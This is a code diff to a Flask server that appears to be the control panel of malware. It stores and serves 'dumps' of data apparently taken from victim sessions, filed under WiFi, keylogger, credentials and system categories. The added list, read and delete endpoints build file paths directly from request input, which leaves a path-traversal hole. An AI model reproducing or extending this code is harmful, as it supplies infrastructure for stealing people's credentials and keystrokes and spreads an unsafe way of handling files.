@@ -704,7 +704,7 @@ def wifi_dump():
             return jsonify({'error': response['error']}), 500
             
         # Create dumps directory if it doesn't exist
-        dumps_dir = os.path.join('dumps', 'wifi')
+        dumps_dir = os.path.join('dumps', 'network')
         os.makedirs(dumps_dir, exist_ok=True)
         
         # Save WiFi data to file
@@ -712,8 +712,17 @@ def wifi_dump():
         filename = f'wifi_dump_{session_id}_{timestamp}.json'
         filepath = os.path.join(dumps_dir, filename)
         
+        # Save the file with metadata
+        dump_data = {
+            'category': 'network',
+            'type': 'wifi',
+            'timestamp': datetime.now().isoformat(),
+            'session_id': session_id,
+            'data': response['wifi_data']
+        }
+        
         with open(filepath, 'w') as f:
-            f.write(response['wifi_data'])
+            json.dump(dump_data, f, indent=2)
             
         return jsonify({
             'success': True,
@@ -723,6 +732,120 @@ def wifi_dump():
         
     except Exception as e:
         logging.error(f"Error in wifi_dump: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/dumps', methods=['GET'])
+def get_dumps():
+    """Get all dumps"""
+    try:
+        dumps = []
+        dumps_dir = 'dumps'
+        
+        # Create dumps directory if it doesn't exist
+        os.makedirs(dumps_dir, exist_ok=True)
+        
+        # If dumps directory is empty, return empty list
+        if not os.listdir(dumps_dir):
+            return jsonify([])
+        
+        # Walk through all directories in dumps
+        for root, dirs, files in os.walk(dumps_dir):
+            category = os.path.basename(root)
+            if category == 'dumps':  # Skip root directory
+                continue
+                
+            # Create category directory if it doesn't exist
+            category_dir = os.path.join(dumps_dir, category)
+            os.makedirs(category_dir, exist_ok=True)
+                
+            for file in files:
+                filepath = os.path.join(root, file)
+                try:
+                    with open(filepath, 'r') as f:
+                        content = json.load(f)
+                        
+                    dumps.append({
+                        'id': f"{category}/{file}",
+                        'name': file,
+                        'category': category,
+                        'timestamp': content.get('timestamp', ''),
+                        'size': os.path.getsize(filepath)
+                    })
+                except Exception as e:
+                    logging.error(f"Error reading dump file {filepath}: {str(e)}")
+                    continue
+        
+        return jsonify(dumps)
+        
+    except Exception as e:
+        logging.error(f"Error getting dumps: {str(e)}")
+        # Create necessary directories and return empty list instead of error
+        try:
+            os.makedirs('dumps/network', exist_ok=True)
+            os.makedirs('dumps/keylogger', exist_ok=True)
+            os.makedirs('dumps/credentials', exist_ok=True)
+            os.makedirs('dumps/system', exist_ok=True)
+            os.makedirs('dumps/other', exist_ok=True)
+        except Exception as dir_error:
+            logging.error(f"Error creating dump directories: {str(dir_error)}")
+        return jsonify([])
+
+@app.route('/api/dumps/<path:dump_id>', methods=['GET'])
+def get_dump(dump_id):
+    """Get a specific dump by ID"""
+    try:
+        filepath = os.path.join('dumps', dump_id)
+        if not os.path.exists(filepath):
+            return jsonify({'error': 'Dump not found'}), 404
+            
+        with open(filepath, 'r') as f:
+            content = json.load(f)
+            
+        return jsonify({
+            'id': dump_id,
+            'name': os.path.basename(filepath),
+            'category': content.get('category', 'other'),
+            'timestamp': content.get('timestamp', ''),
+            'content': json.dumps(content.get('data', content), indent=2),
+            'size': os.path.getsize(filepath)
+        })
+        
+    except Exception as e:
+        logging.error(f"Error getting dump {dump_id}: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/dumps/<path:dump_id>', methods=['DELETE'])
+def delete_dump(dump_id):
+    """Delete a specific dump"""
+    try:
+        filepath = os.path.join('dumps', dump_id)
+        if not os.path.exists(filepath):
+            return jsonify({'error': 'Dump not found'}), 404
+            
+        os.remove(filepath)
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        logging.error(f"Error deleting dump {dump_id}: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/dumps/clear/<category>', methods=['POST'])
+def clear_dumps(category):
+    """Clear all dumps in a category"""
+    try:
+        dumps_dir = os.path.join('dumps', category)
+        if not os.path.exists(dumps_dir):
+            return jsonify({'error': 'Category not found'}), 404
+            
+        for file in os.listdir(dumps_dir):
+            filepath = os.path.join(dumps_dir, file)
+            if os.path.isfile(filepath):
+                os.remove(filepath)
+                
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        logging.error(f"Error clearing dumps for category {category}: {str(e)}")
         return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
